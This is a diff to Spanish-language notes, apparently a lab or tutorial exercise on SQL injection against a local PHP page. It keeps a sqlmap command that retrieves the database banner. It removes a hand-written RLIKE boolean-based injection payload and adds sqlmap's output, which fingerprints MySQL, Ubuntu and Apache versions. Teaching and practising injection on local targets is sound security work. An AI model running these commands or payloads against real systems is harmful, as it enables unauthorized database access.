@@ -14,8 +14,11 @@ Al tener las variables concatenadas puedes hacer inyeccion SQL:
 
 ```bash
 sqlmap -u "http://127.0.0.1:8080/servidor.php?nombre=yo&mensaje=hola" -b
-```
 
-```bash
-hola' RLIKE (SELECT IF(COUNT(DISTINCT(table_schema))=1, 'hola', 0x28) FROM INFORMATION_SCHEMA.TABLES) AND 'TMTd'='TMTd
+5.5.62-0ubuntu0.14.04.1-log
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7
+back-end DBMS operating system: Linux Ubuntu
+back-end DBMS: MySQL >= 5.0.12
+banner: '5.5.62-0ubuntu0.14.04.1-log'
 ```
